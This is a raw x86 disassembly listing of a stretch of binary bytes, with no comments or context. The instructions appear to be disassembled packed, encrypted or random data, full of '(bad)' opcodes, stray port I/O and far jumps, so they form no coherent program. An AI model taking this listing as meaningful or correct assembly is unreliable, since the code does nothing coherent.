  413f43:	lahf   
  413f44:	retf   0xf52c
  413f47:	js     0x413fa5
  413f49:	pop    esi
  413f4a:	cdq    
  413f4b:	add    esp,DWORD PTR [ebp+0xa]
  413f4e:	xchg   ebx,eax
  413f4f:	test   eax,0x1f5b0d14
  413f54:	int3   
  413f55:	and    eax,0xe431bac5
  413f5a:	mov    ecx,0x8aa45480
  413f5f:	test   BYTE PTR [edx-0x74],ch
  413f62:	loopne 0x413f6c
  413f64:	scas   eax,DWORD PTR es:[edi]
  413f65:	jne    0x413f1c
  413f67:	pop    esp
  413f68:	loope  0x413fcb
  413f6a:	sub    DWORD PTR [esi+eax*1-0x41],esp
  413f6e:	jb     0x413f40
  413f70:	cmp    eax,0x49d9daff
  413f75:	jne    0x413fbb
  413f77:	fdivr  st,st(5)
  413f79:	hlt    
  413f7a:	pop    edi
  413f7b:	xor    DWORD PTR [ecx+0x77],edx
  413f7e:	xchg   edi,eax
  413f7f:	xchg   esp,ebx
  413f81:	jnp    0x414001
  413f83:	inc    edx
  413f84:	loope  0x413ff1
  413f86:	lea    eax,ss:[ebp-0x2a]
  413f8a:	imul   eax,DWORD PTR [esi],0xffffff92
  413f8d:	and    al,0xc1
  413f8f:	pop    edx
  413f90:	add    BYTE PTR [ecx+0x44],dh
  413f93:	pusha  
  413f94:	nop
  413f95:	mov    dh,0xa8
  413f97:	cmp    BYTE PTR [ebx+0x7c],0xd0
  413f9b:	fdiv   st(5),st
  413f9d:	sbb    eax,0x620e4617
  413fa2:	mov    dh,0x59
  413fa4:	(bad)  ds:0xfa4cfd22
  413faa:	lods   al,BYTE PTR ds:[esi]
  413fab:	fsubr  QWORD PTR [ebp+edi*4+0x2e1fd5b2]
  413fb2:	dec    ebx
  413fb3:	adc    eax,0x8fb397e3
  413fb8:	jecxz  0x413f48
  413fba:	out    0x74,al
  413fbc:	(bad)  
  413fbd:	mov    cl,0xb4
  413fbf:	clc    
  413fc0:	imul   DWORD PTR [ecx-0x67]
  413fc3:	scas   al,BYTE PTR es:[edi]
  413fc4:	mov    dh,0x6b
  413fc6:	repnz mov edi,0xf27ed860
  413fcc:	dec    eax
  413fcd:	(bad)  
  413fce:	lock add edi,DWORD PTR [esi+esi*2-0x348d8b3d]
  413fd6:	dec    esi
  413fd7:	and    edx,eax
  413fd9:	lock jne 0x414014
  413fdc:	in     eax,0x71
  413fde:	aas    
  413fdf:	and    al,0x83
  413fe1:	inc    eax
  413fe2:	lods   eax,DWORD PTR ds:[esi]
  413fe3:	cwde   
  413fe4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413fe5:	mov    al,0xbf
  413fe7:	popa   
  413fe8:	jmp    0x3af1:0x5624a8a7
  413fef:	hlt    
  413ff0:	xchg   DWORD PTR [ebp+0x3f908975],edx
  413ff6:	es mov dh,0xd9
  413ff9:	inc    esp
  413ffa:	mov    al,0x9f
  413ffc:	push   0x7b
  413ffe:	xchg   edi,eax
  413fff:	jmp    0x900479b5
  414004:	mov    al,ds:0x100d289f
  414009:	and    al,0xe7
  41400b:	daa    
  41400c:	and    DWORD PTR [edi+0x70],ebp
  41400f:	aam    0x2c
  414011:	ds xchg edx,eax
  414013:	and    bh,ch
  414015:	inc    ebp
  414016:	adc    bh,BYTE PTR [esi+0xe]
  414019:	sub    edi,edx
  41401b:	sar    BYTE PTR [edx],1
  41401d:	mov    ebp,0xddf86e33
  414022:	and    al,0xf3
  414024:	pusha  
  414025:	je     0x413fad
  414027:	outs   dx,BYTE PTR ds:[esi]
  414028:	inc    esi
  414029:	and    esi,DWORD PTR [edx+eiz*4]
  41402c:	lock mov bh,0x5b
  41402f:	gs (bad) 
  414031:	imul   DWORD PTR [ecx+0x4e]
  414034:	or     bh,BYTE PTR [esi+0x1f01be79]
  41403a:	and    edx,DWORD PTR [ecx-0x72ed061a]
  414040:	aad    0x5b
  414042:	daa    
  414043:	retf   0x180b
  414046:	push   edi
  414047:	adc    DWORD PTR [ebx],esp
  414049:	les    eax,FWORD PTR [edx+ecx*2]
  41404c:	push   esi
  41404d:	aam    0x36
  41404f:	fistp  QWORD PTR [edx-0x5a]
  414052:	mov    ds:0x1bca42fc,eax
  414057:	into   
  414058:	daa    
  414059:	mov    esp,0xe9d83ee
  41405e:	inc    eax
  41405f:	xchg   dh,cl
  414061:	dec    esp
  414062:	push   cs
  414063:	pop    ecx
  414064:	and    BYTE PTR [edx-0x33bbe249],al
  41406a:	push   ebp
  41406b:	aam    0x53
  41406d:	ds imul eax,esi,0x8e5ad483
  414074:	and    DWORD PTR [ebx-0x2dea93b1],edx
  41407a:	cmp    al,0x9e
  41407c:	xor    eax,0x3e13e279
  414081:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414082:	xchg   edi,eax
  414083:	pop    DWORD PTR [ebp-0x2ed3629]
  414089:	in     eax,0x42
  41408b:	jo     0x4140fe
  41408d:	jecxz  0x414021
  41408f:	sub    bl,BYTE PTR [eax]
  414091:	mov    gs,ebp
  414093:	jae    0x4140c3
  414095:	pop    esi
  414096:	test   eax,0xf2e252b8
  41409b:	jl     0x41408e
  41409d:	inc    ecx
  41409e:	and    DWORD PTR [edx-0x7d379faf],edi
  4140a4:	loopne 0x4140b9
  4140a6:	sub    dl,BYTE PTR [edi-0x63]
  4140a9:	dec    ebx
  4140aa:	sbb    eax,0xd417dd3f
  4140af:	sub    eax,0x4546d15e
  4140b4:	or     DWORD PTR ds:0xaff0cdee,ebx
  4140ba:	push   eax
  4140bb:	xchg   BYTE PTR [ebx+0x6e],dh
  4140be:	in     al,dx
  4140bf:	mov    edi,0x17e206e2
  4140c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4140c5:	jb     0x414075
  4140c7:	inc    ebx
  4140c8:	mov    edi,0x5a223284
  4140cd:	cmp    BYTE PTR [edi-0xc13b09e],dh
  4140d3:	dec    esi
  4140d4:	addr16 push edi
  4140d6:	test   eax,0xa71f80c7
  4140dc:	repz and DWORD PTR [ecx-0x38],esp
  4140e0:	cmc    
  4140e1:	pop    eax
  4140e2:	outs   dx,BYTE PTR ds:[esi]
  4140e3:	sahf   
  4140e4:	fmul   QWORD PTR [esi-0x32fb78c5]
  4140ea:	jmp    0x4140b3
  4140ec:	fsubr  DWORD PTR [ebx]
  4140ee:	inc    esp
  4140ef:	cmp    al,0xe5
  4140f1:	jge    0x41408f
  4140f3:	sub    ah,BYTE PTR ds:[eax-0x5a]
  4140f7:	bound  ebp,QWORD PTR [ecx+edi*1+0x5b]
  4140fb:	xchg   esi,eax
  4140fc:	jle    0x4140d2
  4140fe:	push   ebp
  4140ff:	loop   0x4140a6
  414101:	lea    eax,[ebx+0x23be3a58]
  414107:	test   eax,0x9001af37
  41410c:	into   
  41410d:	sub    ecx,DWORD PTR ds:[ecx-0x7f7796c4]
  414114:	cmp    BYTE PTR ss:[edx],dl
  414117:	sbb    edx,DWORD PTR [bp+di+0x56]
  41411b:	mov    ch,BYTE PTR [eax+0x26]
  41411e:	addr16 pusha 
  414120:	and    esp,DWORD PTR [esp+edi*8-0x1506739f]
  414127:	ins    DWORD PTR es:[edi],dx
  414128:	xchg   DWORD PTR [eax+0x15ad65c4],edi
  41412e:	in     eax,0x33
  414130:	ss mov bh,0xe0
  414133:	jb     0x414133
  414135:	pop    es
  414136:	in     al,dx
  414137:	sahf   
  414138:	popa   
  414139:	retf   
  41413a:	or     cl,BYTE PTR [edx]
  41413c:	pop    edx
  41413d:	xchg   esi,eax
  41413e:	mov    ebx,0x2c036efd
  414143:	and    al,0x51
  414145:	ins    DWORD PTR es:[edi],dx
  414146:	sub    eax,0x72585880
  41414b:	(bad)  
  41414c:	repz sar cl,cl
  41414f:	xchg   ebp,eax
  414150:	adc    dh,BYTE PTR [esi-0x5]
  414153:	jmp    0x4141cd
  414155:	mov    ds:0xc3afefe4,eax
  41415a:	inc    eax
  41415b:	neg    al
  41415d:	mov    ah,0xce
  41415f:	fadd   QWORD PTR [edx+0x75]
  414162:	es sub dh,ah
  414165:	sub    BYTE PTR [eax],ch
  414167:	leave  
  414168:	mov    ebx,0x46879c1b
  41416d:	stos   DWORD PTR es:[edi],eax
  41416e:	pop    edx
  41416f:	(bad)  
  414170:	xchg   ecx,eax
  414171:	sub    eax,DWORD PTR [ecx-0x256b3307]
  414177:	inc    esi
  414178:	ror    dh,1
  41417a:	retf   
  41417b:	cmp    bh,BYTE PTR [edx+ebp*1-0x34]
  41417f:	test   DWORD PTR [ecx+0x5f04ef78],esi
  414185:	popa   
  414186:	push   edi
  414187:	mov    edi,0x27d161b7
  41418c:	(bad)  
  41418d:	adc    al,0xf6
  41418f:	mov    ds:0xd07cfa27,al
  414194:	rcl    ah,0xdb
  414197:	inc    edi
  414198:	xchg   ecx,eax
  414199:	mov    cl,0x52
  41419b:	rcl    BYTE PTR [ebp+edi*2+0x40],cl
  41419f:	or     BYTE PTR [edx],dl
  4141a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141a2:	mov    edx,0x2d403a7
  4141a7:	mov    ebp,0xb8d73d06
  4141ac:	out    dx,al
  4141ad:	imul   eax,DWORD PTR [ecx],0xefb6f124
  4141b3:	push   edx
  4141b4:	xchg   esi,eax
  4141b5:	and    eax,0x5627986c
  4141ba:	cli    
  4141bb:	je     0x414175
  4141bd:	pop    ss
  4141be:	mov    es,WORD PTR [esi]
  4141c0:	cli    
  4141c1:	and    al,dl
  4141c3:	shl    eax,cl
  4141c5:	push   edi
  4141c6:	stos   BYTE PTR es:[edi],al
  4141c7:	add    bh,BYTE PTR [ebp+0x38552ca1]
  4141cd:	das    
  4141ce:	push   esp
  4141cf:	push   ecx
  4141d0:	scas   al,BYTE PTR es:[edi]
  4141d1:	bound  ebp,QWORD PTR [ebp-0x1fd20666]
  4141d7:	(bad)  
  4141d8:	cdq    
  4141d9:	and    eax,0xd66a956a
  4141de:	jmp    0xada7:0x4233f280
  4141e5:	cmp    ch,BYTE PTR [eax+0x3d999c54]
  4141eb:	fmul   st,st(1)
  4141ed:	(bad)  
  4141ee:	retf   0x83ad
  4141f1:	scas   eax,DWORD PTR es:[edi]
  4141f2:	jg     0x414257
  4141f4:	adc    ebx,DWORD PTR [ebp+0x30]
  4141f7:	jge    0x4141ab
  4141f9:	mov    fs:0xf08c86f8,eax
  4141ff:	jb     0x414220
  414201:	fsubr  QWORD PTR [esi]
  414203:	dec    ecx
  414204:	push   esp
  414205:	mov    edx,0x2968371
  41420a:	ficomp DWORD PTR [eax-0x3d93bec8]
  414210:	jbe    0x4141a9
  414212:	or     edi,DWORD PTR [ecx]
  414214:	xor    edi,DWORD PTR [esp+edi*8-0x2d]
  414218:	std    
  414219:	add    cl,BYTE PTR [eax+ebx*2]
  41421c:	lods   eax,DWORD PTR ds:[esi]
  41421d:	xor    cl,BYTE PTR [edx-0xa]
  414220:	adc    eax,0xa7d9d9f8
  414225:	mov    ah,0x79
  414227:	push   es
  414228:	popa   
  414229:	clc    
  41422a:	jbe    0x4141e5
  41422c:	stos   DWORD PTR es:[edi],eax
  41422d:	popf   
  41422e:	cmp    DWORD PTR [ecx+ecx*8-0x66],esi
  414232:	into   
  414233:	mov    BYTE PTR [edx+0x21b68cf0],0xf6
  41423a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41423b:	out    0x3f,al
  41423d:	daa    
  41423e:	retf   
  41423f:	xchg   edi,eax
  414240:	mul    esi
  414242:	pop    ds
  414243:	test   DWORD PTR [edi+esi*4-0x68c501dd],ebx
  41424a:	fdiv   DWORD PTR [ebp-0x12]
  41424d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41424e:	xchg   ecx,eax
  41424f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414250:	das    
  414251:	mov    ebx,DWORD PTR cs:[ebp-0x70]
  414255:	or     ax,di
  414258:	pop    ecx
  414259:	das    
  41425a:	adc    al,0xa4
  41425c:	pop    eax
  41425d:	shl    BYTE PTR [eax+ecx*1],cl
  414260:	mov    al,ds:0xcb687f80
  414265:	icebp  
  414266:	adc    DWORD PTR [ecx],ebp
  414268:	cmc    
  414269:	push   0xfffffffb
  41426b:	push   eax
  41426c:	fnstenv [ebx+0x3b]
  41426f:	dec    ebp
  414270:	and    ebp,DWORD PTR [ecx]
  414272:	outs   dx,BYTE PTR ds:[esi]
  414273:	fstp   QWORD PTR [ebx+0x27]
  414276:	push   ebp
  414277:	cmp    al,0xf5
  414279:	jmp    0x414277
  41427b:	or     eax,0x3df1935d
  414280:	adc    eax,0x2e3a7e7a
  414285:	les    edx,FWORD PTR [ebx-0x5773ae3e]
  41428b:	out    0x50,al
  41428d:	pop    esp
  41428e:	(bad)  
  41428f:	mov    dl,0x96
  414291:	cmp    BYTE PTR [ecx+0x7e],0x17
  414295:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414296:	mov    dl,0xbb
  414298:	mov    fs,WORD PTR [ebx-0x39eb84eb]
  41429e:	cmp    BYTE PTR [ebp+0xd0fe617],0x66
  4142a5:	cdq    
  4142a6:	es inc ebp
  4142a8:	jbe    0x4142a6
  4142aa:	xchg   ebp,eax
  4142ab:	daa    
  4142ac:	sbb    al,BYTE PTR [edx]
  4142ae:	popa   
  4142af:	mov    esp,0xa206041e
  4142b4:	xchg   ebp,eax
  4142b5:	jno    0x414296
  4142b7:	(bad)  
  4142b8:	xchg   edx,eax
  4142b9:	das    
  4142ba:	popa   
  4142bb:	ds xchg edx,eax
  4142bd:	mov    dl,0xd0
  4142bf:	call   0x9e3a:0x9e1203a3
  4142c6:	add    ecx,DWORD PTR [edi-0x3]
  4142c9:	mov    ebx,0xc478308b
  4142ce:	pushf  
  4142cf:	lods   eax,DWORD PTR ds:[esi]
  4142d0:	ja     0x414343
  4142d2:	push   0x21
  4142d4:	shl    DWORD PTR [ebp+0x40bdc265],1
  4142da:	mov    esi,0xb17a4627
  4142df:	pop    es
  4142e0:	clc    
  4142e1:	inc    esp
  4142e2:	ds jne 0x414340
  4142e5:	(bad)  
  4142e6:	pop    eax
  4142e7:	addr16 adc eax,0x1a709f0e
  4142ed:	inc    esp
  4142ee:	in     eax,dx
  4142ef:	stos   BYTE PTR es:[edi],al
  4142f0:	add    DWORD PTR [eax],eax
  4142f2:	mov    ds:0x3fb40fc8,al
  4142f7:	and    al,0xe0
  4142f9:	jnp    0x4142cd
  4142fb:	sbb    ch,bl
  4142fd:	sub    eax,0x4df33105
  414302:	adc    DWORD PTR [esi+0x346fc962],edi
  414308:	jbe    0x414321
  41430a:	or     dl,al
  41430c:	daa    
  41430d:	mov    eax,ds:0xe332474e
  414312:	mov    WORD PTR [ecx+0x3c66efc3],ss
  414318:	ins    BYTE PTR es:[edi],dx
  414319:	loopne 0x4142d8
  41431b:	dec    edi
  41431c:	clc    
  41431d:	jns    0x4142b5
  41431f:	add    al,BYTE PTR [edi+eiz*2-0x1e]
  414323:	leave  
  414324:	out    0xa5,al
  414326:	(bad)  
  414327:	int    0x7c
  414329:	xlat   BYTE PTR ds:[ebx]
  41432a:	add    BYTE PTR [ecx-0x4d37bcd1],ch
  414330:	fwait
  414331:	dec    edx
  414332:	sub    BYTE PTR [edx-0x6b],0xc3
  414336:	sub    DWORD PTR [eax],esi
  414338:	call   0xc524:0x92ad38b7
  41433f:	and    DWORD PTR [edx-0x11],edi
  414342:	pop    eax
  414343:	and    eax,DWORD PTR [ecx]
  414345:	repz icebp 
  414347:	inc    eax
  414348:	retf   0x6c8e
  41434b:	or     BYTE PTR [ebp+0x37],ah
  41434e:	push   es
  41434f:	sbb    DWORD PTR [edx],ecx
  414351:	icebp  
  414352:	mov    cl,0x5b
  414354:	mov    ds:0xe1f0decd,al
  414359:	push   ds
  41435a:	enter  0xa84e,0x74
  41435e:	mov    dl,0xdb
  414360:	fucomip st,st(4)
  414362:	test   eax,0x50b63901
  414367:	mov    eax,DWORD PTR [edx]
  414369:	div    DWORD PTR [eax-0x5dbf30bd]
  41436f:	fimul  DWORD PTR [edi+0x1d97b8e6]
  414375:	inc    ebx
  414376:	ins    DWORD PTR es:[edi],dx
  414377:	xor    edx,DWORD PTR [edi+eiz*2-0x53f8d075]
  41437e:	out    dx,al
  41437f:	faddp  st(2),st
  414381:	push   0xa5ba85bf
  414386:	aas    
  414387:	enter  0x7825,0x48
  41438b:	inc    esp
  41438c:	add    ch,BYTE PTR [edx+0x5d]
  41438f:	jns    0x414391
  414391:	sahf   
  414392:	stos   DWORD PTR es:[edi],eax
  414393:	jecxz  0x414391
  414395:	sub    ch,al
  414397:	and    ebp,DWORD PTR [esi-0x54]
  41439a:	fs jae 0x414360
  41439d:	pop    edx
  41439e:	lock rol BYTE PTR [edx-0x6845bb0a],cl
  4143a5:	pop    es
  4143a6:	imul   DWORD PTR [eax+0x4159956b]
  4143ac:	mov    ah,BYTE PTR [esi-0x21b5bf33]
  4143b2:	es je  0x414423
  4143b5:	pop    ecx
  4143b6:	(bad)  
  4143b7:	test   BYTE PTR [edx+0x72],0x9c
  4143bb:	jo     0x4143d2
  4143bd:	push   ebp
  4143be:	and    eax,0x76b33a43
  4143c3:	push   es
  4143c4:	aas    
  4143c5:	out    0x25,al
  4143c7:	pop    es
  4143c8:	jbe    0x4143f5
  4143ca:	xor    al,0x22
  4143cc:	xor    al,0xd5
  4143ce:	sub    eax,0xa819c701
  4143d3:	mov    ebp,0x471e3a60
  4143d8:	dec    esp
  4143d9:	int3   
  4143da:	xor    BYTE PTR [ebp+0xeae7fe8],ch
  4143e0:	and    eax,0x702685bf
  4143e5:	and    eax,0xb4ec72ab
  4143ea:	jg     0x4143b3
  4143ec:	(bad)  
  4143ed:	jo     0x4143ff
  4143ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143f0:	test   BYTE PTR [esi+ebp*8],dh
  4143f3:	test   eax,0xdd66a0db
  4143f8:	push   cs
  4143f9:	fwait
  4143fa:	push   es
  4143fb:	cmp    ecx,DWORD PTR [edx]
  4143fd:	pop    ss
  4143fe:	xorps  xmm1,xmm5
  414401:	mov    ch,0x61
  414403:	dec    esp
  414404:	add    BYTE PTR [ebp-0x56],ah
  414407:	xor    al,0xfb
  414409:	out    0x66,al
  41440b:	sbb    al,0x91
  41440d:	sub    DWORD PTR [ebp+0x395ad783],ecx
  414413:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414414:	pop    ebx
  414415:	mov    ah,0x9a
  414417:	(bad)  
  414418:	sbb    esp,ebp
  41441a:	lea    ebx,[ebp-0x5d]
  41441d:	clc    
  41441e:	sti    
  41441f:	jns    0x4143e1
  414421:	xchg   esi,eax
  414422:	lods   eax,DWORD PTR ds:[esi]
  414423:	xchg   dl,dh
  414425:	mov    DWORD PTR [edi+0x13880388],ebp
  41442b:	gs jmp 0x9e39cb0d
  414431:	cmp    ebx,esi
  414433:	nop
  414434:	push   edx
  414435:	fsubr  QWORD PTR [esi+edi*8]
  414438:	and    dh,BYTE PTR [edx+esi*4+0x6aa5c534]
  41443f:	inc    esp
  414440:	inc    edi
  414441:	mov    bl,0x22
  414443:	push   ds
  414444:	jl     0x4144b5
  414446:	pop    edx
  414447:	out    0x99,al
  414449:	into   
  41444a:	dec    ebp
  41444b:	shl    ebx,0x2e
  41444e:	cmp    eax,0x2b2c85d
  414453:	cmp    esi,DWORD PTR [edi-0x5f]
  414456:	ss pop ebp
  414458:	leave  
  414459:	pop    eax
  41445a:	push   ebx
  41445b:	inc    edi
  41445c:	cmp    eax,0x54c8f28d
  414461:	int    0x19
  414463:	pop    esi
  414464:	les    esp,FWORD PTR [eax+ebp*8]
  414467:	test   ah,ah
  414469:	rol    DWORD PTR [ebp-0x21],0x11
  41446d:	jmp    0xda518b60
  414472:	add    al,bh
  414474:	push   ss
  414475:	jmp    0x76b0:0x452a8ceb
  41447c:	or     cl,BYTE PTR [edi+0x5d]
  41447f:	arpl   WORD PTR [ebx+0x23ab37e2],di
  414485:	shl    BYTE PTR [ebx],1
  414487:	push   cs
  414488:	sub    DWORD PTR ds:0xb8a332c2,esp
  41448e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41448f:	mov    esi,0xdc827fee
  414494:	xchg   ecx,eax
  414495:	daa    
  414496:	icebp  
  414497:	push   edi
  414498:	sbb    eax,0x72bd778c
  41449d:	cmp    esi,ebx
  41449f:	inc    edx
  4144a0:	mov    eax,ds:0x731a185e
  4144a5:	adc    dl,BYTE PTR [edi+0x17]
  4144a8:	in     al,0x11
  4144aa:	cwde   
  4144ab:	les    ebp,FWORD PTR [edi-0x14]
  4144ae:	push   0x3efd7104
  4144b3:	(bad)  
  4144b4:	cmp    dl,BYTE PTR es:[eax+0x724d4bf8]
  4144bb:	xor    eax,0x3a83874d
  4144c0:	fmul   st(5),st
  4144c2:	ss sub eax,0x4c615700
  4144c8:	adc    ah,dh
  4144ca:	aas    
  4144cb:	cmp    ah,bl
  4144cd:	fist   DWORD PTR [edx+0x481617fe]
  4144d3:	dec    ebp
  4144d4:	add    eax,0x3b31a819
  4144d9:	inc    edi
  4144da:	imul   ecx,edx,0x27
  4144dd:	call   0x91a2:0x1a84c4bb
  4144e4:	jmp    0x4a9c:0x1db81b4a
  4144eb:	fdivr  QWORD PTR [ebp+0x5b19d62d]
  4144f1:	push   ecx
  4144f2:	std    
  4144f3:	push   esi
  4144f4:	mov    DWORD PTR ds:0x83f93765,ecx
  4144fa:	shr    ecx,0xa9
  4144fd:	cmove  ebx,DWORD PTR [esi-0x242044ef]
  414504:	ja     0x4144a6
  414506:	mov    ebp,0x4fe3922f
  41450b:	mov    ah,0x2e
  41450d:	icebp  
  41450e:	mov    al,ds:0xf07847a8
  414513:	es inc esp
  414515:	xchg   edi,eax
  414516:	sub    dh,BYTE PTR [edx]
  414518:	call   0x3d548331
  41451d:	les    ebp,FWORD PTR [esi-0x1a426ffc]
  414523:	sti    
  414524:	push   es
  414525:	test   BYTE PTR [edx+0x499cdee8],cl
  41452b:	pop    ebx
  41452c:	les    esp,FWORD PTR [edi]
  41452e:	adc    DWORD PTR [ebx-0x1fbef564],esp
  414534:	sbb    dh,ah
  414536:	and    eax,0x76093d14
  41453b:	lds    ebp,FWORD PTR [edi]
  41453d:	fcomp  QWORD PTR [esi-0xe60974e]
  414543:	xchg   esp,eax
  414544:	ret    0xbfb5
  414547:	mov    eax,ds:0xae18c183
  41454c:	push   0xffffff9e
  41454e:	scas   al,BYTE PTR es:[edi]
  41454f:	inc    ecx
  414550:	xchg   esi,eax
  414551:	daa    
  414552:	pop    ebx
  414553:	push   ebx
  414554:	scas   al,BYTE PTR es:[edi]
  414555:	js     0x414560
  414557:	pop    esi
  414558:	pop    edi
  41455a:	mov    edx,0xf44eb2b0
  41455f:	(bad)  
  414560:	popf   
  414561:	clc    
  414562:	in     eax,0x88
  414564:	xchg   esp,eax
  414565:	mov    dl,0xf9
  414567:	or     eax,0xbb93ea78
  41456c:	adc    BYTE PTR [esi],al
  41456e:	in     al,0x26
  414570:	add    cl,cl
  414572:	shl    BYTE PTR [edx-0x511f0d4e],1
  414578:	jge    0x41458e
  41457a:	sub    dh,BYTE PTR [ecx]
  41457c:	imul   esi,esi,0xffffff96
  41457f:	aas    
  414580:	xor    BYTE PTR [eax-0x79],ah
  414583:	in     eax,dx
  414584:	sbb    al,0xfd
  414586:	pcmpeqb mm3,mm7
  414589:	pop    ds
  41458a:	or     DWORD PTR [esp+ebx*8+0x6d8d4420],eax
  414591:	ja     0x414569
  414593:	or     bh,BYTE PTR [edx]
  414595:	sbb    al,0x83
  414597:	sbb    ecx,esp
  414599:	stc    
  41459a:	scas   eax,DWORD PTR es:[edi]
  41459b:	mov    esi,0x4038c7f
  4145a0:	or     al,0xd1
  4145a2:	cwde   
  4145a3:	jl     0x414596
  4145a5:	ja     0x4145cb
  4145a7:	xchg   edi,eax
  4145a8:	fcmovbe st,st(3)
  4145aa:	in     al,0xc3
  4145ac:	retf   
  4145ad:	push   eax
  4145ae:	and    DWORD PTR [esi],edi
  4145b0:	jg     0x414568
  4145b2:	jae    0x4145b2
  4145b4:	fsub   DWORD PTR [ebx+0x4b]
  4145b7:	mov    ebp,0x26ad4111
  4145bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145bd:	pop    ecx
  4145be:	pop    ebp
  4145bf:	ins    BYTE PTR es:[edi],dx
  4145c0:	xchg   esp,eax
  4145c1:	fist   WORD PTR [eax+ebp*2-0x1]
  4145c5:	xor    esi,ebp
  4145c7:	mov    eax,ds:0x29b1733f
  4145cc:	retf   0x5c79
  4145cf:	push   ecx
  4145d0:	xor    BYTE PTR [ecx-0x71],ah
  4145d3:	push   eax
  4145d4:	sbb    al,0x9b
  4145d6:	repz scas al,BYTE PTR es:[edi]
  4145d8:	dec    esp
  4145d9:	jg     0x41464b
  4145db:	xor    al,0xff
  4145dd:	dec    ebx
  4145de:	pushf  
  4145df:	xor    edi,DWORD PTR [eax+0x5f]
  4145e2:	and    BYTE PTR ds:0x7857914e,al
  4145e8:	sub    bl,BYTE PTR [eax-0x31]
  4145eb:	aas    
  4145ec:	bound  edx,QWORD PTR [esi+0x2d8bf5ed]
  4145f2:	in     al,dx
  4145f3:	std    
  4145f4:	repnz push 0x761aafe4
  4145fa:	add    eax,0x80aaefe2
  4145ff:	in     eax,dx
  414600:	cmp    al,ch
  414602:	jae    0x414654
  414604:	jmp    0x414598
  414606:	fimul  WORD PTR [eax+0x3c]
  414609:	in     al,dx
  41460a:	adc    eax,0xd096b199
  41460f:	mov    edx,0xd30cd9f0
  414614:	xchg   BYTE PTR [ecx],ch
  414616:	inc    ebp
  414617:	push   es
  414618:	mov    eax,0xc586d61b
  41461d:	sbb    BYTE PTR [ecx+0x52],dh
  414620:	fadd   DWORD PTR [esp]
  414623:	xchg   esi,eax
  414624:	sbb    dl,dh
  414626:	jmp    0x5d4c:0x2ef23914
  41462d:	xchg   ah,cl
  41462f:	pusha  
  414630:	push   ebp
  414631:	mov    al,BYTE PTR [ebx-0x6e]
  414634:	int    0x2
  414636:	pop    ebp
  414637:	loopne 0x41463a
  414639:	sbb    dh,BYTE PTR [edi]
  41463b:	mov    dl,ah
  41463d:	cmp    al,0x6f
  41463f:	data16 jns 0x4145f9
  414642:	adc    eax,0x25cfe811
  414647:	sub    al,0xf5
  414649:	(bad)  
  41464a:	test   eax,0x7c2b4db5
  41464f:	stc    
  414650:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414651:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414652:	or     dh,0xab
  414655:	call   0x56bcab78
  41465a:	mov    ebx,0x53897fe8
  41465f:	lahf   
  414660:	dec    edx
  414661:	inc    esp
  414662:	and    dl,0x4b
  414665:	(bad)  
  414667:	xchg   esi,edx
  414669:	test   BYTE PTR [eax],ch
  41466b:	mov    esp,0xc51d4e0e
  414670:	jle    0x41466c
  414672:	add    esp,edx
  414674:	mov    ds:0x63be6fbb,al
  414679:	pop    es
  41467a:	cmp    DWORD PTR [ebx+0x154c2edc],0xffffffe8
  414681:	cli    
  414682:	adc    al,0x64
  414684:	int3   
  414685:	lock jmp 0x41468b
  414688:	lds    ecx,FWORD PTR [esi+ebx*1+0x24]
  41468c:	cli    
  41468d:	into   
  41468e:	and    DWORD PTR [edx+0x3490c167],esp
  414694:	and    eax,0xb498c1e8
  414699:	rcl    DWORD PTR [ecx+0x560a16a7],cl
  41469f:	int3   
  4146a0:	cmp    BYTE PTR [edi-0x16],al
  4146a3:	iret   
  4146a4:	xchg   ebp,eax
  4146a5:	das    
  4146a6:	ins    BYTE PTR es:[edi],dx
  4146a7:	cs lock jecxz 0x414692
  4146ab:	nop
  4146ac:	add    al,0xc6
  4146ae:	data16 ins BYTE PTR es:[edi],dx
  4146b0:	pop    es
  4146b1:	inc    ebp
  4146b2:	sbb    DWORD PTR [ebx+eiz*1-0x3b4119fb],esp
  4146b9:	cwde   
  4146ba:	xchg   ebx,eax
  4146bb:	adc    bl,BYTE PTR fs:[ecx+0x658e06c0]
  4146c2:	pop    edi
  4146c3:	rol    BYTE PTR [edi-0x54],cl
  4146c6:	inc    edx
  4146c7:	aam    0x8f
  4146c9:	ja     0x414699
  4146cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146cc:	or     eax,0xd2f81cb7
  4146d1:	and    DWORD PTR [esi],0x34dfcb3f
  4146d7:	nop
  4146d8:	mov    eax,ds:0xef58d6d0
  4146dd:	xchg   edx,eax
  4146de:	cwde   
  4146df:	stos   DWORD PTR es:[edi],eax
  4146e0:	ret    
  4146e1:	adc    al,0x2c
  4146e3:	cmp    DWORD PTR [edi+0x66],ecx
  4146e6:	mov    dl,cl
  4146e8:	mov    ebx,0x4dff700c
  4146ed:	nop
  4146ee:	in     al,dx
  4146ef:	mov    bh,0xe5
  4146f1:	mov    edx,0x22aa2c07
  4146f6:	mov    ds:0x53b2799a,al
  4146fb:	(bad)  
  4146fc:	push   ebp
  4146fd:	mov    al,BYTE PTR [edx+edx*2-0x25]
  414701:	in     al,dx
  414702:	xchg   ebx,eax
  414703:	inc    ebp
  414704:	lahf   
  414705:	push   es
  414706:	stos   DWORD PTR es:[edi],eax
  414707:	loop   0x41468e
  414709:	xchg   ebp,eax
  41470a:	lds    eax,FWORD PTR [esi]
  41470c:	imul   edx,DWORD PTR [edi-0x229b32c3],0x22cd8c60
  414716:	mov    dh,0xeb
  414718:	mov    ss,WORD PTR [esi+0x9]
  41471b:	mov    bl,BYTE PTR [edi]
  41471d:	jg     0x4146d2
  41471f:	sbb    DWORD PTR [edx-0xf],0x6
  414723:	(bad)  
  414724:	lods   eax,DWORD PTR ds:[esi]
